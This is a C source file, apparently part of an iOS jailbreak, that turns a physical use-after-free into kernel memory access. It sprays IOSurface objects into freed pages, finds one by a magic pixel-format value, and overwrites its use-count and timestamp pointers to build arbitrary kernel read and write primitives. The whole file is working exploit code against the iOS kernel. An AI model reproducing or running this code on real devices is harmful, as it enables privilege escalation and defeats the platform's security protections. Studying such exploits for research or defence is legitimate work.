#include "iosurface.h"
#include "libprejailbreak.h"
#include "puaf.h"
#include "offsets.h"
#include <mach/kern_return.h>
#include <mach/mach_init.h>
#include <Foundation/Foundation.h>
#include <stdint.h>
#include <string.h>

extern const mach_port_t kIOMasterPortDefault;
extern io_service_t IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);
extern CFMutableDictionaryRef IOServiceMatching(const char *);
extern kern_return_t IOServiceOpen(io_service_t, task_port_t, uint32_t, io_connect_t *);
extern kern_return_t IOConnectCallMethod(mach_port_t, uint32_t, uint64_t *, uint32_t, void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
extern kern_return_t IOServiceClose(io_connect_t);
extern kern_return_t IOObjectRelease(io_object_t);

#define IOSurfaceLockResultSize (gOffsets.major >= MAJOR(14) ? 0xF60 : 0xDD0)

typedef struct {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
} fast_create_args_t;

typedef struct {
    uint64_t isa;
    uint8_t pad0[0xc];
    uint32_t read_displacement;
    uint32_t surface_id;
    uint8_t pad1[0x50];
    uint64_t receiver;
    uint8_t pad2[0x2c];
    uint32_t pixel_format;
    uint8_t pad3[0x4];
    uint32_t alloc_size;
    uint8_t pad4[0x10];
    uint64_t use_count;
    uint8_t pad5[0x298];
    uint64_t indexed_timestamp;
    uint8_t pad6[0xbf8]; // Changes throughout versions
} lock_result_t;

struct KRWInfo {
    uint64_t page;
    uint64_t object;
    io_connect_t client;
    io_connect_t surface;
} info;

// MARK: IOSurface getter/setter functions
uint32_t iosurface_get_pixel_format(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->pixel_format;
}

uint32_t iosurface_get_alloc_size(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->alloc_size;
}

uint64_t iosurface_get_receiver(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->receiver;
}

uint64_t iosurface_get_indexed_timestamp_pointer(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->indexed_timestamp;
}

uint64_t iosurface_get_use_count_pointer(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->use_count;
}

void iosurface_set_indexed_timestamp_pointer(uint64_t uaddr, uint64_t value) {
    lock_result_t *result = (lock_result_t *)uaddr;
    result->indexed_timestamp = value;
}

void iosurface_set_use_count_pointer(uint64_t uaddr, uint64_t value) {
    lock_result_t *result = (lock_result_t *)uaddr;
    result->use_count = value;
}

// MARK: IOSurface general functions
void iosurface_init(io_connect_t *client) {
    io_connect_t rootService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    IOServiceOpen(rootService, mach_task_self(), 0, client);
}

void iosurface_release(io_connect_t client, uint32_t surface) {
    uint64_t id = (uint64_t)surface;
    IOConnectCallMethod(client, 1, &id, 1, 0, 0, 0, 0, 0, 0);
}

// MARK: IOSurface spray functions
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
    if (*nClients >= 0x4000) return;
    for (int i = 0; i < nSurfaces; i++) {
        fast_create_args_t args;
        lock_result_t result;
        bzero(&args, sizeof(fast_create_args_t));
        bzero(&result, sizeof(lock_result_t));
        
        size_t size = IOSurfaceLockResultSize;
        args.address = 0;
        args.alloc_size = *nClients + 1;
        args.pixel_format = IOSURFACE_MAGIC;
        
        kern_return_t kr = IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
        if (kr != KERN_SUCCESS) {
            printf("WARNING: failed to create IOSurface\n");
        }
        io_connect_t id = result.surface_id;
        
        (*clients)[*nClients] = id;
        *nClients = (*nClients) += 1;
    }
}

int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *task_self, uint64_t *puafPage) {
    io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
    int nSurfaceIDs = 0;
    
    for (int i = 0; i < 0x400; i++) {
        spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);
        
        for (int j = 0; j < nPages; j++) {
            uint64_t start = puafPages[j];
            uint64_t stop = start + (pages(1) / 16);
            
            for (uint64_t k = start; k < stop; k += 8) {
                if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
                    info.object = k;
                    info.page = start;
                    if (puafPage) *puafPage = start;
                    info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
                    info.client = client;
                    if (task_self) *task_self = iosurface_get_receiver(k);
                    goto sprayDone;
                }
            }
        }
    }
    
sprayDone:
    for (int i = 0; i < nSurfaceIDs; i++) {
        if (surfaceIDs[i] == info.surface) continue;
        iosurface_release(client, surfaceIDs[i]);
    }
    
    if (nSurfaceIDs >= 0x4000) {
        return -1; // Maximum attempts reached
    }
    
    free(surfaceIDs);
    
    if (info.object == 0) {
        return -1; // No object found
    }
    
    return 0;
}

void iosurface_deinit(uint64_t *puafPages) {
    IOServiceClose(info.client);
    IOObjectRelease(info.surface);
    uint64_t page = info.page;
    if (page != 0) {
        vm_deallocate(mach_task_self(), page - VME_OFFSET, VME_SIZE);
    }
    bzero(&info, sizeof(struct KRWInfo));
    gPrimitives.kread32 = NULL;
    gPrimitives.kread64 = NULL;
    gPrimitives.kwrite32 = NULL;
    gPrimitives.kwrite64 = NULL;
    gPrimitives.kreadbuf = NULL;
    gPrimitives.kwritebuf = NULL;
}

// MARK: IOSurface methods
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
    uint64_t args[3] = {surfaceID, 0, value};
    IOConnectCallMethod(client, gOffsets.major == MAJOR(12) ? 32 : 33, args, 3, 0, 0, 0, 0, 0, 0);
}

uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
    uint64_t args[1] = {surfaceID};
    uint32_t size = 1;
    uint64_t out = 0;
    IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
    return (uint32_t)out;
}

// MARK: IOSurface primitives
uint32_t iosurface_kread32(uint64_t addr) {
    uint64_t orig = iosurface_get_use_count_pointer(info.object);
    iosurface_set_use_count_pointer(info.object, addr - 0x14);
    uint32_t value = get_use_count(info.client, info.surface);
    iosurface_set_use_count_pointer(info.object, orig);
    return value;
}

uint64_t iosurface_kread64(uint64_t addr) {
    uint32_t low = iosurface_kread32(addr);
    uint32_t high = iosurface_kread32(addr + 4);
    return (((uint64_t)high << 32) | (uint64_t)low);
}

int iosurface_kwrite32(uint64_t va, uint32_t value) {
    uint64_t current = iosurface_kread64(va);
    current &= 0xffffffff00000000;
    current |= (uint64_t)value;
    iosurface_kwrite64(va, current);
    return 0;
}

int iosurface_kwrite64(uint64_t va, uint64_t value) {
    uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
    iosurface_set_indexed_timestamp_pointer(info.object, va);
    set_indexed_timestamp(info.client, info.surface, value);
    iosurface_set_indexed_timestamp_pointer(info.object, orig);
    return 0;
}

int iosurface_kreadbuf(uint64_t va, void *buffer, size_t size) {
    uint64_t aligned = (size + 7) & ~7;
    uint64_t *tmpbuf = malloc(aligned);

    for (uint64_t i = 0; i < aligned / sizeof(uint64_t); i++) {
        tmpbuf[i] = iosurface_kread64(va + (i * sizeof(uint64_t)));
    }

    memcpy(buffer, tmpbuf, size);

    free(tmpbuf);

    return 0;
}

int iosurface_kwritebuf(uint64_t va, void *buffer, size_t size) {
    uint64_t aligned = (size + 7) & ~7;
    uint64_t *tmpbuf = malloc(aligned);

    memcpy(tmpbuf, buffer, size);

    for (uint64_t i = 0; i < aligned / sizeof(uint64_t); i++) {
        iosurface_kwrite64(va + (i * sizeof(uint64_t)), tmpbuf[i]);
    }

    free(tmpbuf);

    return 0;
}